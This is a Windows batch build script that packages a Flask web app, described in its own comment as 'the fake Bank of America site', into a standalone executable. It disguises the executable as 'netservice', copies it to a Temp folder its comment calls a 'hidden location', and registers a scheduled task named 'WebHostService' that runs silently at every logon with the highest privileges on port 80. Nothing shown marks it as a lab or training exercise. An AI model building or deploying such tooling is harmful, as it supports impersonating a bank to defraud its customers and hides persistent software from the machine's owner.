@echo off
setlocal enabledelayedexpansion

REM ========================================
REM Flask Bank App Builder
REM Packages the fake Bank of America site into a standalone .exe
REM ========================================

set "OUTPUT_NAME=netservice"
set "TASK_NAME=WebHostService"
set "DEPLOY_DIR=%LOCALAPPDATA%\Temp"

REM Check for --dev flag
set "DEV_MODE=0"
set "CONSOLE_FLAG=--noconsole"

if "%1"=="--dev" (
    set "DEV_MODE=1"
    set "CONSOLE_FLAG=--console"
    echo [DEV MODE ENABLED]
    echo.
)

echo ========================================
echo Building Flask Bank App
echo ========================================
echo.

REM Check if required files exist
if not exist "app.py" (
    echo ERROR: app.py not found!
    echo Please run this script from the site directory.
    pause
    exit /b 1
)

if not exist "templates" (
    echo ERROR: templates directory not found!
    pause
    exit /b 1
)

if not exist "static" (
    echo ERROR: static directory not found!
    pause
    exit /b 1
)

if not exist "data" (
    echo ERROR: data directory not found!
    pause
    exit /b 1
)

REM Clean previous build
echo Cleaning previous build...
if exist "dist\%OUTPUT_NAME%.exe" del /q "dist\%OUTPUT_NAME%.exe"
if exist "dist\.dev_mode" del /q "dist\.dev_mode"
if exist "build" rd /s /q build
if exist "__pycache__" rd /s /q __pycache__
echo.

REM Build with PyInstaller
echo Building %OUTPUT_NAME%.exe...
echo (This may take a few minutes...)
echo.

pyinstaller ^
    --onefile ^
    %CONSOLE_FLAG% ^
    --name "%OUTPUT_NAME%" ^
    --add-data "templates;templates" ^
    --add-data "static;static" ^
    --add-data "data;data" ^
    --hidden-import=flask ^
    --hidden-import=jinja2 ^
    --collect-all flask ^
    --collect-all jinja2 ^
    --noconfirm ^
    app.py

if errorlevel 1 (
    echo.
    echo ERROR: PyInstaller build failed!
    pause
    exit /b 1
)

REM Verify the build
if not exist "dist\%OUTPUT_NAME%.exe" (
    echo.
    echo ERROR: dist\%OUTPUT_NAME%.exe was not created!
    pause
    exit /b 1
)

echo.
echo Build successful: dist\%OUTPUT_NAME%.exe
echo.

REM Create .dev_mode marker if in dev mode
if "%DEV_MODE%"=="1" (
    echo Creating .dev_mode marker...
    echo. > "dist\.dev_mode"
    echo Dev mode marker created at: dist\.dev_mode
    echo.
) else (
    REM Ensure no .dev_mode marker exists in production
    if exist "dist\.dev_mode" del /q "dist\.dev_mode"
)

REM Deploy exe to hidden location
echo Deploying to: %DEPLOY_DIR%\%OUTPUT_NAME%.exe
if not exist "%DEPLOY_DIR%" mkdir "%DEPLOY_DIR%"
copy /y "dist\%OUTPUT_NAME%.exe" "%DEPLOY_DIR%\%OUTPUT_NAME%.exe" >nul

REM Copy .dev_mode marker if in dev mode
if "%DEV_MODE%"=="1" (
    copy /y "dist\.dev_mode" "%DEPLOY_DIR%\.dev_mode" >nul
    echo Copied .dev_mode marker to deployment directory
) else (
    REM Clean up any existing .dev_mode marker in production
    if exist "%DEPLOY_DIR%\.dev_mode" del /q "%DEPLOY_DIR%\.dev_mode"
)

echo.
echo ========================================
echo Installing Task Scheduler Service
echo ========================================
echo.

REM Check for Administrator privileges
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    echo WARNING: This script should be run as Administrator to install Task Scheduler task.
    echo The task may not be created properly without admin privileges.
    echo.
    pause
)

REM Stop existing service if running
tasklist /FI "IMAGENAME eq %OUTPUT_NAME%.exe" 2>NUL | find /I /N "%OUTPUT_NAME%.exe">NUL
if %errorlevel% equ 0 (
    echo Stopping existing %OUTPUT_NAME%.exe process...
    taskkill /f /im %OUTPUT_NAME%.exe >nul 2>&1
    timeout /t 2 /nobreak >nul
)

REM Delete existing task if it exists
schtasks /query /tn "%TASK_NAME%" >nul 2>&1
if %errorlevel% equ 0 (
    echo Removing existing task: %TASK_NAME%
    schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
)

REM Create new task to run on startup (requires admin)
echo Creating Task Scheduler task: %TASK_NAME%
schtasks /create ^
    /tn "%TASK_NAME%" ^
    /tr "\"%DEPLOY_DIR%\%OUTPUT_NAME%.exe\"" ^
    /sc onlogon ^
    /rl highest ^
    /f >nul 2>&1

if %errorlevel% equ 0 (
    echo Task created successfully!
    echo Task will run at startup with highest privileges (required for port 80)
    echo.
    echo Starting service now...
    schtasks /run /tn "%TASK_NAME%" >nul 2>&1
    if %errorlevel% equ 0 (
        echo Service started successfully!
    ) else (
        echo WARNING: Failed to start service automatically.
        echo You may need to start it manually or reboot.
    )
) else (
    echo WARNING: Failed to create Task Scheduler task!
    echo You may need to run this script as Administrator.
)

echo.
echo ========================================
echo Build Complete!
echo ========================================
echo.
echo Executable: %DEPLOY_DIR%\%OUTPUT_NAME%.exe
echo Task Name:  %TASK_NAME%
echo.

if "%DEV_MODE%"=="1" (
    echo [DEV MODE] Console window will be visible
    echo [DEV MODE] Flask debug mode enabled
    echo.
    echo To test, run: %DEPLOY_DIR%\%OUTPUT_NAME%.exe
    echo.
) else (
    echo [PRODUCTION] Silent background execution
    echo [PRODUCTION] Starts automatically on boot
    echo.
    echo To start now, run: schtasks /run /tn "%TASK_NAME%"
    echo To stop, run:      taskkill /f /im %OUTPUT_NAME%.exe
    echo To uninstall, run: schtasks /delete /tn "%TASK_NAME%" /f
    echo.
)

pause

